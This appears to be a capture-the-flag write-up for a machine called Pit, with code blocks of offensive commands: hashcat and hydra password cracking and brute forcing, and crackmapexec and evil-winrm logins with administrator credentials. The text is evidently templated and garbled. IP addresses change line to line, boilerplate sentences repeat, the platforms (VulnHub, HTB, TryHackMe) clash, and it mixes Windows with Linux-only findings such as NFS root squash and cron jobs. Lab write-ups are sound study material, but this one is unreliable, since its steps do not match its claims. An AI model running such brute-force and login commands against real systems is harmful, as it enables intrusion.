---
TitleSEO: "VulnHub — Pit (Hard Windows) | ZureFX"
TitlePost: "VulnHub — Pit (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Pit. DCSync and Cron Job to achieve hard compromise on Windows."
Keywords: "reversing, ctf, tryhackme, offsec"
URL: "https://zurefx.github.io/writeups/htb-pit-286.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-pit-286/"
Date: "2025-09-25"
Tags: "Reversing, CTF, TryHackMe, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-pit-286"
Permalink: "/writeups/htb-pit-286.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Pit** is rated **Hard** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.88.128.39`.

### Objectives

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.148.18/FUZZ
```

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.15.117.157 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.10.210.234 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.95.234.187/FUZZ
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.208.136/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **NFS No Root Squash**.

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
evil-winrm -i 10.18.38.150 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.56.72/FUZZ
nmap -sCV -p5432,135,5986 10.106.39.23 -oN scan.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.65.195 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

```powershell
evil-winrm -i 10.19.15.93 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.24.110.107/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.121.3.205/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.50.173.147/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

## Summary

### Tools Used

- `john`
- `ffuf`
- `msfvenom`
- `wpscan`
- `hashcat`
- `socat`
- `pwncat`
- `ldapsearch`

### Key Takeaways

- DCSync
- Cron Job
- NFS No Root Squash
